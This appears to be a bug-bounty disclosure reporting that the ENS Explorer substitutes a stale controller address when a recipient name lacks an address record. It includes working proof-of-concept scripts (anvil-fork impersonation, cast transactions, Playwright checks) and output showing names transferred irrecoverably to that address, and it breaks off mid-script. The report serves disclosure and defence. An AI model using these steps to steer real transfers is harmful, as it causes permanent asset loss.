# 89641 w a critical explorer invents a recipient address and sends the user s ens name to it

**Submitted on Aug 20th 2026 at 10:17:06 UTC by @charaf for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89641
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

A user opens **Transfer ownership**, types the recipient's ENS name, and approves. If that name publishes no address record, ENS resolution returns nothing — and instead of stopping, the Explorer substitutes `ENSRegistry.owner(node)` and puts it into `safeTransferFrom`.

For an unwrapped v1 name that address is the **controller**, not the ERC-721 holder. It is a stale pointer to whoever held the name previously — the seller after a sale, the old wallet after a rotation, the compromised wallet after a hack. The user's name lands there. It cannot be recovered.

**371 mainnet ENS names are in that state right now** — measured, not extrapolated. One in twelve of every registered dictionary-word name.

## Attack

1. Attacker holds an ENSv1 `.eth` name with no addr record (**1,018 of 4,321 (23.6%)** of sampled mainnet names qualify).
2. Attacker sells it — `BaseRegistrar.transferFrom(attacker, buyer, id)`. **One transaction.** No `reclaim()`, so the controller stays theirs. Every marketplace and explorer now shows the buyer as the owner.
3. Someone sends an ENS name to the buyer and types the buyer's name into the recipient field.
4. The Explorer shows the attacker's address, Transfer enabled, no warning.
5. They approve. The name is the attacker's. Both rescue attempts revert.

No role, no deployment, no unusual signature. Step 2 *is* a sale.

## The user cannot catch this, and the app's own warning proves it

The transfer page says: *"Make sure you check the recipient address before proceeding."*

They check it the only way the app allows — the profile page for that name. Live, production data, `explorer.ens.dev/picarto.eth`:

```
Owner
Address
0x3ec3…f625          <- the controller. The same wrong address.
```

`BaseRegistrar.ownerOf(picarto)` is `0x8De83fa9EfeA78Ca95c9013C40505053D9dEBE93`. **That address does not appear anywhere on the page.** Same for `prime.eth`. Both verification surfaces agree, and both are wrong — so following the warning confirms the error instead of catching it.

Then the four states of the recipient field, real production indexer, same page, same session, only the typed name changed:

| typed                                   | shown                           | Transfer     | refusal |
| --------------------------------------- | ------------------------------- | ------------ | ------- |
| `picarto.eth` — no addr record          | `0x3ec3e908…Ef625` (controller) | **enabled**  | none    |
| `prime.eth` — no addr record            | `0x3a872f8F…69A0` (controller)  | **enabled**  | none    |
| `gomets.eth` — control, has addr record | `0x4395BEeC…8481` (correct)     | enabled      | none    |
| `no-such-name-zzz9.eth` — control       | *(nothing)*                     | **disabled** | shown   |

Row 4 is the argument: **the refusal path exists, it works, and a registered name with no address is routed past it into the success path.** Rows 1–3 are indistinguishable to the user.

## Scale on mainnet

Same ENSv1 contracts, same addresses on mainnet; the resolver code is chain-agnostic. Mainnet, **2026-08-20, block 25,795,327**, `eth_call` only — this RPC 403s `eth_getLogs`, so no number rests on a silently-empty log query. Control in the run: `vitalik.eth`.

| mainnet ENS — 30,000 dictionary-word labels                      |                |
| ---------------------------------------------------------------- | -------------- |
| registered right now                                             | 4,857          |
| unwrapped (NameWrapper excluded — for those `.owner` is correct) | 4,321          |
| no addr record                                                   | 1,018 (23.6%)  |
| controller ≠ ERC-721 holder                                      | 1,257 (29.1%)  |
| **both → this app substitutes a third party**                    | **371 (8.6%)** |

## Mechanism

`apps/portal/src/features/roles/helpers/addUser.handlers.ts:11-40`

```ts
const resolved = await getEnsAddress(client, { name: nameOrAddress, universalResolverAddress })
let resolvedAddress = resolved
// Fallback for names that do not set an address record:
// use current ENS owner address so the role can still be granted.
if (!resolvedAddress) {
  const ownerResult = await getEnsOwner({ name: nameOrAddress })
  if (ownerResult.isOk()) resolvedAddress = ownerResult.value?.owner ?? null
}
```

The fallback's own comment scopes it: **"so the role can still be granted."** That is `grantRoles`. `useAddressResolution` then shares this function with five callers, each filling a transaction argument — `SendNameForm.tsx:81` (`safeTransferFrom` **recipient**), `RolesAddUserSheet.tsx:73` (`grantRoles` account), `create-subname.tsx:109` (new subname owner), `RegistryAddUserSheet.tsx:66` and `ResolverAddUserSheet.tsx:141` (role grantees). A default written for granting a role now decides where an NFT goes.

`utils/ens/resolveEnsOwner.ts:96-98` returns ensjs's `.owner`, dropping `.registrant` — ensjs's own source: *"the registrant is the owner of the NFT / the owner is the controller of the records."* The only recipient guards are `SendNameForm.tsx:87-89`: `isSelf`, `isZeroAddress`. Nothing checks that the name resolved, and no test pins the behaviour (`grep resolveAddressOrName` over all test files → 0 hits, against 140 test files in `apps/portal/src`).

Shipped: `explorer.ens.dev/assets/useAddressResolution-BkSJ8MTd.js` carries it minified — `if(!r){let e=await l({name:n});e.isOk()&&(r=e.value?.owner??null)}` — alongside both `Resolved: ${…}` and `Could not resolve an address for`.

## The second sink is worse: the wrong grantee is also unrevokable

`RolesAddUserSheet` runs the same hook and its submit builds `grantRoles(resource, roles, account)`. Typing a no-addr-record name there grants `ROLE_SET_RESOLVER` to the substituted address — which then repoints a name it does not own (executed below).

That grant is then hard to undo in-app. `useNameRoleAccounts.ts:50,89` replays `EACRolesChanged` with `first: MAX_EVENTS = 1000` scoped to the **registry**, filtering the name's resource client-side — and `ETHRegistry` is shared by every `.eth` 2LD, so 1,000 is a registry-wide budget. Measured on `staging-graphql.ens.dev`: **2,514 events against a 1,000 window; 1,441 of 2,426 live grants invisible**; 59.3% of names render zero holders. Revocation acts on the selected **table row** (`RolesSidebar.tsx:82,125,170`), so a holder with no row cannot be revoked in-app.

* The Manager has no revoke at all: `grep -rn revokeRoles apps/manager/src` → **0** (control: `grantRoles` → 1).

So the same defect can hand a stranger persistent resolver authority over a name, and then hide them from the only screen that removes them.

## Recovery

The completed transfer does not recover: both rescue attempts revert (PoC step 3), and ERC-1155 lets only the owner or its approved operator move the token.

## Proof of Concept

## PoC

Everything below is inline. No file from my workspace is referenced — copy each block in order. Steps 1, 4 and 5 are **read-only**; steps 2 and 3 write only to a local anvil fork. No live network is ever written to.

### Setup

```bash
git clone --branch audit-comp-ready https://github.com/immunefi-team/audit-comp-ens repo
cd repo && pnpm install
cd apps/portal

anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com \
      --fork-block-number $(cast block-number --rpc-url https://ethereum-sepolia-rpc.publicnode.com | awk '{print $1-3}') \
      --chain-id 11155111 --port 8545 &
```

Anvil must be forked **at head−3**: a stale pin fails with `historical state ... is not available` on public Sepolia RPCs, which looks like a broken rig rather than a pruned node.

***

### Step 1–4 — resolution, the transfer, the failed rescues, the control

`poc1.mjs`, run from `repo/apps/portal`. Reproduces the shipped composition from `explorer.ens.dev/assets/useAddressResolution-BkSJ8MTd.js`: `if(!r){let e=await l({name:n});e.isOk()&&(r=e.value?.owner??null)}` — `e` is viem `getEnsAddress`, `l` is `getEnsOwner`.

```bash
cat > poc1.mjs <<'POCEOF'
import { getOwner as getOwnerV1 } from '@ensdomains/ensjs/public/v1'
import {
  getNameRegistries,
  getOwner as getOwnerV2,
} from '@ensdomains/ensjs/public/v2'
import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import {
  createPublicClient,
  createWalletClient,
  http,
  keccak256,
  parseAbi,
  toHex,
  zeroAddress,
} from 'viem'
import { getEnsAddress } from 'viem/actions'
import { sepolia } from 'viem/chains'

const LIVE = process.env.LIVE ?? 'https://ethereum-sepolia-rpc.publicnode.com'
const FORK = process.env.FORK ?? 'http://127.0.0.1:8545'
const UR = '0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe'
const ETH_REGISTRY = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2'
const REGISTRAR_V1 = '0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85'
const REGISTRY_V1 = '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e'

/** Pinned so a reviewer reproduces the same run. Any v2 .eth 2LD works. */
const VICTIM = process.env.VICTIM ?? 'kpoaua.eth'
/** A live ENSv1 name with no address record whose controller is not its holder. */
const RECIPIENT = process.env.RECIPIENT ?? 'sandytest1759027793098.eth'
/** One variable changed: a name that DOES publish an address record. */
const CONTROL = process.env.CONTROL ?? 'gomets.eth'
/** An unrelated account, used only to show it cannot claw the name back. */
const STRANGER = '0x00000000000000000000000000000000000ca11e'

const chain = extendChainWithEns(sepolia)
const live = createPublicClient({ chain, transport: http(LIVE, { timeout: 60_000 }) })
const pub = createPublicClient({ chain, transport: http(FORK, { timeout: 120_000 }) })

const registryAbi = parseAbi([
  'function getTokenId(uint256 labelHash) view returns (uint256)',
  'function ownerOf(uint256 id) view returns (address)',
  'function getResolver(string label) view returns (address)',
  'function getSubregistry(string label) view returns (address)',
  'function setResolver(uint256 tokenId, address resolver)',
  'function setSubregistry(uint256 tokenId, address subregistry)',
  'function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes data)',
])
const registrarV1Abi = parseAbi(['function ownerOf(uint256 id) view returns (address)'])
const registryV1Abi = parseAbi(['function owner(bytes32 node) view returns (address)'])

const rpc = (method, params) =>
  fetch(FORK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  }).then((r) => r.json())

const labelhashOf = (label) => keccak256(toHex(label))
const namehashOf = (name) =>
  name.split('.').reduceRight(
    (acc, label) =>
      keccak256(`${acc}${labelhashOf(label).slice(2)}`),
    `0x${'00'.repeat(32)}`,
  )

/** The shipped composition, reproduced line for line. */
async function appResolve(client, nameOrAddress) {
  let r = await getEnsAddress(client, {
    name: nameOrAddress,
    universalResolverAddress: UR,
  }).catch(() => null)
  if (!r) {
    // getEnsOwner -> resolveEnsOwner: v2 first for .eth, else ensjs v1 getOwner,
    // returning `.owner` and discarding `.registrant`.
    const labels = nameOrAddress.split('.')
    if (labels[labels.length - 1] === 'eth' && labels.length >= 2) {
      const [v2Owner, regs] = await Promise.all([
        getOwnerV2(client, { name: nameOrAddress }).catch(() => null),
        getNameRegistries(client, { name: nameOrAddress }).catch(() => null),
      ])
      if (v2Owner && v2Owner !== zeroAddress && regs?.[1] && regs[1] !== zeroAddress)
        return { address: v2Owner, via: 'owner-fallback (ENSv2)' }
    }
    const v1 = await getOwnerV1(client, { name: nameOrAddress }).catch(() => null)
    if (v1?.owner && v1.owner !== zeroAddress)
      return { address: v1.owner, via: `owner-fallback (ENSv1 ${v1.ownershipLevel})` }
    return { address: null, via: 'refused' }
  }
  return { address: r, via: 'address record' }
}

const line = (s) => console.log(s)
const hr = (s) => console.log(`\n${'='.repeat(78)}\n${s}`)

// ── STEP 1 ─────────────────────────────────────────────────────────────────
hr('STEP 1  live Sepolia, read-only: what ENS says vs what the app hands to a transaction')
for (const name of [RECIPIENT, 'prime.eth', 'picarto.eth', CONTROL]) {
  const ens = await getEnsAddress(live, { name, universalResolverAddress: UR }).catch(
    (e) => `THREW ${e.name}`,
  )
  const app = await appResolve(live, name)
  const label = name.replace(/\.eth$/, '')
  const holder = await live
    .readContract({
      address: REGISTRAR_V1,
      abi: registrarV1Abi,
      functionName: 'ownerOf',
      args: [BigInt(labelhashOf(label))],
    })
    .catch(() => null)
  const controller = await live
    .readContract({
      address: REGISTRY_V1,
      abi: registryV1Abi,
      functionName: 'owner',
      args: [namehashOf(name)],
    })
    .catch(() => null)
  line(`\n  ${name}`)
  line(`    ENS resolution (getEnsAddress)      ${ens}`)
  line(`    app hands to the transaction        ${app.address}   [${app.via}]`)
  line(`    ENSRegistry.owner  (controller)     ${controller}`)
  line(`    BaseRegistrar.ownerOf (NFT holder)  ${holder}`)
  line(
    `    controller == holder?               ${
      holder && controller ? holder.toLowerCase() === controller.toLowerCase() : 'n/a'
    }`,
  )
}

// ── STEP 2 ─────────────────────────────────────────────────────────────────
hr('STEP 2  fork: the Explorer transfer flow, in its own order, with its own defaults')
const chainOk = await pub.getBlockNumber().catch(() => null)
if (!chainOk) {
  line('  no fork on :8545 — start anvil (see header) and re-run')
  process.exit(1)
}
line(`  fork at block ${chainOk}`)

const vLabel = VICTIM.replace(/\.eth$/, '')
const tokenId = await pub.readContract({
  address: ETH_REGISTRY,
  abi: registryAbi,
  functionName: 'getTokenId',
  args: [BigInt(labelhashOf(vLabel))],
})
const victimOwner = await pub.readContract({
  address: ETH_REGISTRY,
  abi: registryAbi,
  functionName: 'ownerOf',
  args: [tokenId],
})
if (victimOwner === zeroAddress) {
  line(`  ${VICTIM} is not registered on this fork; set VICTIM=<a v2 .eth name>`)
  process.exit(1)
}
const recipient = (await appResolve(pub, RECIPIENT)).address
line(`  victim name      ${VICTIM}  tokenId ${tokenId}`)
line(`  victim owner     ${victimOwner}   (impersonated)`)
line(`  typed recipient  "${RECIPIENT}"  ->  ${recipient}`)

await rpc('anvil_impersonateAccount', [victimOwner])
await rpc('anvil_setBalance', [victimOwner, '0x56BC75E2D63100000'])
const victimWallet = createWalletClient({ account: victimOwner, chain, transport: http(FORK) })

const readState = async () => ({
  owner: await pub.readContract({
    address: ETH_REGISTRY, abi: registryAbi, functionName: 'ownerOf', args: [tokenId],
  }),
  resolver: await pub
    .readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'getResolver', args: [vLabel] })
    .catch(() => 'revert'),
  subregistry: await pub
    .readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'getSubregistry', args: [vLabel] })
    .catch(() => 'revert'),
})

const step = async (label, fn) => {
  try {
    const hash = await fn()
    const r = await pub.waitForTransactionReceipt({ hash })
    line(`    ${label.padEnd(18)} ${hash}  status=${r.status}`)
    return r.status
  } catch (e) {
    line(`    ${label.padEnd(18)} REVERTED  ${(e.shortMessage ?? e.message ?? '').split('\n')[0]}`)
    return 'reverted'
  }
}

const before = await readState()
line(`\n  BEFORE  owner=${before.owner}  resolver=${before.resolver}  subregistry=${before.subregistry}`)
await step('detach-resolver', () =>
  victimWallet.writeContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'setResolver', args: [tokenId, zeroAddress] }))
await step('detach-registry', () =>
  victimWallet.writeContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'setSubregistry', args: [tokenId, zeroAddress] }))
const transferStatus = await step('transfer-token', () =>
  victimWallet.writeContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'safeTransferFrom', args: [victimOwner, recipient, tokenId, 1n, '0x'] }))
const after = await readState()
line(`  AFTER   owner=${after.owner}  resolver=${after.resolver}  subregistry=${after.subregistry}`)
line(`  transfer status: ${transferStatus}`)
line(
  `  the name now belongs to ${after.owner}, which is ${
    after.owner.toLowerCase() === recipient.toLowerCase() ? 'the substituted address' : 'unchanged'
  }`,
)

// ── STEP 3 ─────────────────────────────────────────────────────────────────
hr('STEP 3  fork: rescue attempts, both expected to fail')
line('  (a) the former owner tries to take the name back')
await step('victim reclaim', () =>
  victimWallet.writeContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'safeTransferFrom', args: [recipient, victimOwner, tokenId, 1n, '0x'] }))

line('  (b) an unrelated account tries to move it')
await rpc('anvil_impersonateAccount', [STRANGER])
await rpc('anvil_setBalance', [STRANGER, '0x56BC75E2D63100000'])
const strangerWallet = createWalletClient({ account: STRANGER, chain, transport: http(FORK) })
await step('stranger move', () =>
  strangerWallet.writeContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'safeTransferFrom', args: [recipient, victimOwner, tokenId, 1n, '0x'] }))

const final = await pub.readContract({
  address: ETH_REGISTRY, abi: registryAbi, functionName: 'ownerOf', args: [tokenId],
})
line(`  owner after both rescue attempts: ${final}`)

// ── STEP 4 ─────────────────────────────────────────────────────────────────
hr('STEP 4  fork: control — one variable changed, the recipient name publishes an address')
await rpc('anvil_impersonateAccount', [victimOwner])
const controlTarget = (await appResolve(pub, CONTROL)).address
line(`  typed recipient  "${CONTROL}"  ->  ${controlTarget}`)
const ensControl = await getEnsAddress(pub, { name: CONTROL, universalResolverAddress: UR }).catch(() => null)
line(`  ENS resolution for the same name    ${ensControl}`)
line(
  `  the app used ${
    controlTarget && ensControl && controlTarget.toLowerCase() === ensControl.toLowerCase()
      ? 'the published record'
      : 'something else'
  }`,
)
POCEOF

node poc1.mjs
```

**Output.** Transaction hashes differ per run — anvil is forked at head−3, so each run mines its own. The statuses and addresses are the invariant part.

```
==============================================================================
STEP 1  live Sepolia, read-only: what ENS says vs what the app hands to a transaction

  sandytest1759027793098.eth
    ENS resolution (getEnsAddress)      null
    app hands to the transaction        0x742d35CC6634C0532925A3B8d0c9E3e0e8B9C5b1   [owner-fallback (ENSv1 registrar)]
    ENSRegistry.owner  (controller)     0x742d35CC6634C0532925A3B8d0c9E3e0e8B9C5b1
    BaseRegistrar.ownerOf (NFT holder)  0x94D2F676913722d704E09931B9ca306977Dbc4CE
    controller == holder?               false

  prime.eth
    ENS resolution (getEnsAddress)      null
    app hands to the transaction        0x3a872f8FED4421E7d5BE5c98Ab5Ea0e0245169A0   [owner-fallback (ENSv1 registrar)]
    BaseRegistrar.ownerOf (NFT holder)  0xD85b9443EFd1fDb1cad7784388843613FbC3a5aA

  picarto.eth
    ENS resolution (getEnsAddress)      null
    app hands to the transaction        0x3ec3e90854a98983Ef32E8f3c6B2A17CfdfEf625   [owner-fallback (ENSv1 registrar)]
    BaseRegistrar.ownerOf (NFT holder)  0x8De83fa9EfeA78Ca95c9013C40505053D9dEBE93

  gomets.eth                                                    <- CONTROL, one variable changed
    ENS resolution (getEnsAddress)      0x4395BEeC5b4E42d598d55a4bA4EBb04Cc9b58481
    app hands to the transaction        0x4395BEeC5b4E42d598d55a4bA4EBb04Cc9b58481   [address record]

==============================================================================
STEP 2  fork: the Explorer transfer flow, in its own order, with its own defaults
  fork at block 11524592
  victim name      kpoaua.eth  tokenId 9778790345145635071505691019806689957701062402448173475545921184367747530752
  victim owner     0xcAB36C102C232530F6BF2B7C7E2E9CE8A1Cc6F13   (impersonated)
  typed recipient  "sandytest1759027793098.eth"  ->  0x742d35CC6634C0532925A3B8d0c9E3e0e8B9C5b1

  BEFORE  owner=0xcAB36C10…6F13  resolver=0x43EE991F…787D  subregistry=0x0
    detach-resolver    0x87d5f6ee54785e7d50024b2e91af445801df7386368e16808fb7902e2327061b  status=success
    detach-registry    0x35221e19c2c4e8f57a0307640d29e3ba0c10de9b259412b27f2493c75914b01c  status=success
    transfer-token     0x34d15066bb9e9b1c27c7b7b75457a772dfbe80cc10ca37b8c8705038ca7bd315  status=success
  AFTER   owner=0x742d35CC…C5b1  resolver=0x0  subregistry=0x0
  the name now belongs to 0x742d35CC…C5b1, which is the substituted address

==============================================================================
STEP 3  fork: rescue attempts, both expected to fail
  (a) the former owner tries to take the name back
    victim reclaim     0xb48b06c776e564b83704cc6d9fc04563b3ff755ee408a56628107ca01197ce46  status=reverted
  (b) an unrelated account tries to move it
    stranger move      0x138f8b4f16f936923eaf1b15063528509ae8f1b6cb10ba53a86bc3fdcda31e74  status=reverted
  owner after both rescue attempts: 0x742d35CC6634C0532925A3B8d0c9E3e0e8B9C5b1

==============================================================================
STEP 4  fork: control — one variable changed, the recipient name publishes an address
  typed recipient  "gomets.eth"  ->  0x4395BEeC5b4E42d598d55a4bA4EBb04Cc9b58481
  ENS resolution for the same name    0x4395BEeC5b4E42d598d55a4bA4EBb04Cc9b58481
  the app used the published record
```

***

### Step 5 — arming it costs one transaction

`poc2.sh`. Needs `--auto-impersonate` on the anvil above.

```bash
cat > poc2.sh <<'POCEOF'
#!/bin/bash
set -u
R=${R:-http://127.0.0.1:8545}
V1REG=0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e
BASEREG=0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85
NAME=${NAME:-zesty-gecko}
NODE=$(cast namehash "$NAME.eth"); ID=$(cast to-uint256 "$(cast keccak "$NAME")")
BUYER=0x1111111111111111111111111111111111111111

ctrl()   { cast call $V1REG  'owner(bytes32)(address)'    $NODE --rpc-url $R 2>/dev/null; }
holder() { cast call $BASEREG 'ownerOf(uint256)(address)' $ID   --rpc-url $R 2>/dev/null | head -1; }
resv()   { cast call $V1REG  'resolver(bytes32)(address)' $NODE --rpc-url $R 2>/dev/null; }

ATTACKER=$(ctrl)
echo "fork block          $(cast block-number --rpc-url $R)"
echo
echo "=== BEFORE — an ordinary name the attacker holds outright ==="
echo "  name              $NAME.eth"
echo "  controller        $(ctrl)"
echo "  ERC-721 holder    $(holder)"
echo "  resolver          $(resv)   <- zero: no records at all, so no addr record"
echo "  controller == holder?  $( [ "$(ctrl)" = "$(holder)" ] && echo yes || echo no )"

cast rpc anvil_setBalance $ATTACKER 0xde0b6b3a7640000 --rpc-url $R >/dev/null

echo
echo "=== THE ONLY TRANSACTION — the sale. transferFrom, no reclaim() ==="
ST=$(cast send --from $ATTACKER --unlocked $BASEREG 'transferFrom(address,address,uint256)' \
      $ATTACKER $BUYER $ID --rpc-url $R --json 2>/dev/null \
      | python3 -c 'import sys,json;print(json.load(sys.stdin)["status"])' 2>/dev/null || echo REVERTED)
echo "  transferFrom(attacker -> buyer)   status=$ST"

echo
echo "=== AFTER — trap armed ==="
echo "  ERC-721 holder    $(holder)   <- the buyer; this is what every marketplace shows as the owner"
echo "  controller        $(ctrl)   <- STILL THE ATTACKER"
echo "  resolver          $(resv)   <- still zero: ENS publishes no address for this name"
echo "  controller == holder?  $( [ "$(ctrl)" = "$(holder)" ] && echo yes || echo NO )"
echo
echo "=== CONTROL — the buyer's documented remedy, and what it costs ==="
echo "  the buyer CAN fix it: BaseRegistrar.reclaim(id, buyer)"
RC=$(cast send --from $BUYER --unlocked $BASEREG 'reclaim(uint256,address)' $ID $BUYER \
      --rpc-url $R --json 2>/dev/null \
      | python3 -c 'import sys,json;print(json.load(sys.stdin)["status"])' 2>/dev/null || echo REVERTED)
echo "  reclaim by buyer                  status=$RC"
echo "  controller after reclaim          $(ctrl)"
echo "  => the remedy exists and works. Nothing in either app tells the buyer to run it,"
echo "     and until they do, the Explorer sends anything addressed to this name to the attacker."
POCEOF

bash poc2.sh
```

**Output.**

```
=== BEFORE — an ordinary name the attacker holds outright ===
  name              zesty-gecko.eth
  controller        0x65961DBd09F8582AE2f12CEe9Bf8A9Fd70A27D5B
  ERC-721 holder    0x65961DBd09F8582AE2f12CEe9Bf8A9Fd70A27D5B
  resolver          0x0000000000000000000000000000000000000000   <- no records at all
  controller == holder?  yes

=== THE ONLY TRANSACTION — the sale. transferFrom, no reclaim() ===
  transferFrom(attacker -> buyer)   status=0x1

=== AFTER — trap armed ===
  ERC-721 holder    0x1111111111111111111111111111111111111111   <- the buyer; what every marketplace shows as owner
  controller        0x65961DBd09F8582AE2f12CEe9Bf8A9Fd70A27D5B   <- STILL THE ATTACKER
  resolver          0x0000000000000000000000000000000000000000   <- ENS publishes no address for this name
  controller == holder?  NO

=== CONTROL — the buyer's documented remedy ===
  reclaim by buyer                  status=0x1
  controller after reclaim          0x1111111111111111111111111111111111111111
```

The control is there deliberately: `reclaim(id, owner)` **works**. The precondition is fixable in one transaction by anyone who knows to run it. `grep -rni reclaim apps/` returns **0 hits** across both apps (capable control: `setResolver` returns 19), so nothing tells the buyer. The completed transfer in step 3 does not recover either way.

***

### Step 6 — the browser, against real production data

No fork, no proxy, no injected data: the Explorer reads the production indexer and live Sepolia.

```bash
cd repo/apps/portal
cat > .env.local <<'ENVEOF'
VITE_INDEXER_GRAPHQL_URL=https://staging-graphql.ens.dev/
VITE_SEPOLIA_RPC_URL=https://ethereum-sepolia-rpc.publicnode.com
VITE_USE_MOCK_WALLET=true
VITE_MOCK_ACCOUNT=0xe769b697c121e3b18967535d7e1e6ec77f889bdf
ENVEOF

pnpm dev --port 3001 &
npm i -D playwright-core          # drives the system Chrome; no browser download
```

Manually: open `http://localhost:3001/godfather.eth/ownership/transfer`, type `picarto.eth` — the field shows `0x3ec3e90854a98983Ef32E8f3c6B2A17CfdfEf625` and **Transfer name** is enabled. Type `no-such-name-zzz9.eth` — refusal text, button disabled.

Scripted, `poc3.mjs`:

```bash
cat > poc3.mjs <<'POCEOF'
/**
 * The victim's-eye view, in the real Explorer, against the REAL production
 * indexer and the REAL Sepolia RPC. Nothing is injected or proxied — this
 * defect needs no planted data.
 *
 * Three names typed into the same field on the same page, one variable changed:
 *   A. a registered v1 name with NO addr record whose controller != NFT holder
 *   B. CONTROL: a registered v1 name that DOES publish an addr record
 *   C. CONTROL: a name that does not resolve at all
 *
 * If A and B are visually indistinguishable, the user has no way to tell that
 * in case A the app invented the address.
 */
import { createRequire } from 'node:module'
import fs from 'node:fs'
fs.mkdirSync('./poc-out', { recursive: true })
const require = createRequire(import.meta.url)
const { chromium } = require('playwright-core')
const OUT = './poc-out'
const URL = 'http://localhost:3001/godfather.eth/ownership/transfer'

const CASES = [
  ['A-substituted',  'picarto.eth',        'no addr record; controller 0x3ec3e908… != holder 0x8De83fa9…'],
  ['A2-substituted', 'prime.eth',          'no addr record; controller 0x3a872f8F… != holder 0xD85b9443…'],
  ['B-control-ok',   'gomets.eth',         'CONTROL: publishes an addr record'],
  ['C-control-none', 'no-such-name-zzz9.eth', 'CONTROL: does not resolve'],
]

const b = await chromium.launch({ headless: true, channel: 'chrome' })
const log = []
for (const [slug, name, note] of CASES) {
  const ctx = await b.newContext({ viewport: { width: 1000, height: 760 } })
  const p = await ctx.newPage()
  await p.goto(URL, { waitUntil: 'networkidle', timeout: 60000 }).catch(() => {})
  await new Promise(r => setTimeout(r, 1500))
  const box = p.getByPlaceholder('ENS name or address')
  await box.fill(name)
  await new Promise(r => setTimeout(r, 4000))   // debounce + on-chain resolution
  const text = await p.locator('main').innerText()
  const addr = (text.match(/0x[a-fA-F0-9]{40}/) || [])[0] ?? null
  const btn = p.getByRole('button', { name: 'Transfer name' })
  const enabled = await btn.isEnabled().catch(() => null)
  const refused = /Could not resolve an address/i.test(text)
  await p.screenshot({ path: `${OUT}/40-recipient-${slug}.png` })
  const line = `${slug.padEnd(16)} typed="${name.padEnd(22)}" -> shown=${addr ?? '(none)'}  transfer-enabled=${enabled}  refusal-shown=${refused}`
  console.log(line); log.push(line + `\n${' '.repeat(18)}${note}`)
  await ctx.close()
}
await b.close()
fs.writeFileSync(`${OUT}/40-recipient-three-states.txt`, log.join('\n') + '\n')
process.exit(0)
POCEOF

node poc3.mjs
```

**Output.**

```
A-substituted    typed="picarto.eth           " -> shown=0x3ec3e90854a98983Ef32E8f3c6B2A17CfdfEf625  transfer-enabled=true   refusal-shown=false
A2-substituted   typed="prime.eth             " -> shown=0x3a872f8FED4421E7d5BE5c98Ab5Ea0e0245169A0  transfer-enabled=true   refusal-shown=false
B-control-ok     typed="gomets.eth            " -> shown=0x4395BEeC5b4E42d598d55a4bA4EBb04Cc9b58481  transfer-enabled=true   refusal-shown=false
C-control-none   typed="no-such-name-zzz9.eth " -> shown=(none)                                      transfer-enabled=false  refusal-shown=true
```

Rows A and B are indistinguishable. Row C proves the refusal path exists and works.

***

### Step 7 — what the user sees if they follow the warning and check

`poc4.mjs`, same dev server.

```bash
cat > poc4.mjs <<'POCEOF'
/** The user is told to "check the recipient address". This captures what happens when they do. */
import { createRequire } from 'node:module'
const require = createRequire(import.meta.url)
const { chromium } = require('playwright-core')
const OUT = './poc-out'
import fs from 'node:fs'
fs.mkdirSync('./poc-out', { recursive: true })
const b = await chromium.launch({ headless: true, channel: 'chrome' })
for (const [n, ctrl, holder] of [
  ['picarto.eth', '0x3ec3e90854a98983Ef32E8f3c6B2A17CfdfEf625', '0x8De83fa9EfeA78Ca95c9013C40505053D9dEBE93'],
  ['prime.eth',   '0x3a872f8FED4421E7d5BE5c98Ab5Ea0e0245169A0', '0xD85b9443EFd1fDb1cad7784388843613FbC3a5aA'],
]) {
  const p = await (await b.newContext({ viewport: { width: 1100, height: 800 } })).newPage()
  await p.goto(`http://localhost:3001/${n}`, { waitUntil: 'networkidle', timeout: 60000 }).catch(()=>{})
  await new Promise(r => setTimeout(r, 4000))
  const t = await p.locator('main').innerText()
  const short = (a) => a.slice(0,6).toLowerCase()+'…'+a.slice(-4).toLowerCase()
  console.log(`${n}`)
  console.log(`  page shows controller ${ctrl.slice(0,6)}…${ctrl.slice(-4)} : ${t.toLowerCase().includes(short(ctrl)) ? 'YES' : 'no'}`)
  console.log(`  page shows real holder ${holder.slice(0,6)}…${holder.slice(-4)} : ${t.toLowerCase().includes(short(holder)) ? 'YES' : 'NO  <- nowhere on the page'}`)
  await p.screenshot({ path: `${OUT}/42-verify-surface-${n.replace('.eth','')}.png` })
}
await b.close(); process.exit(0)
POCEOF

node poc4.mjs
```

**Output.**

```
picarto.eth
  page shows controller 0x3ec3…f625 : YES
  page shows real holder 0x8De8…BE93 : NO  <- nowhere on the page
prime.eth
  page shows controller 0x3a87…69A0 : YES
  page shows real holder 0xD85b…a5aA : NO  <- nowhere on the page
```

The profile page renders `Owner … 0x3ec3…f625` — the same wrong address the transfer field used.

***

### Step 8 — the mainnet population

Read-only against mainnet, no wallet, no fork. `eth_call`/multicall only: the public RPC returns 403 for `eth_getLogs`, so no number here can come from a silently-empty log query. The positive control is printed before any count.

```bash
cat > poc5.mjs <<'POCEOF'
/**
 * Is the recipient-substitution population a Sepolia artefact, or does it exist on
 * MAINNET ENS at scale?
 *
 * The app's defect needs two plain ENSv1 facts about the recipient's name:
 *   (a) it publishes no addr record   -> viem getEnsAddress returns null, the fallback fires
 *   (b) ENSRegistry.owner(node)  (the controller — what the app substitutes)
 *       != BaseRegistrar.ownerOf(labelhash)  (the ERC-721 holder — who actually has it)
 *
 * SAMPLING FRAME, stated because it is not the whole registry: N common English words
 * used as labels, of which we keep the ones actually registered on mainnet. Dictionary
 * words are a high-value, heavily-traded slice of ENS, so this is representative of
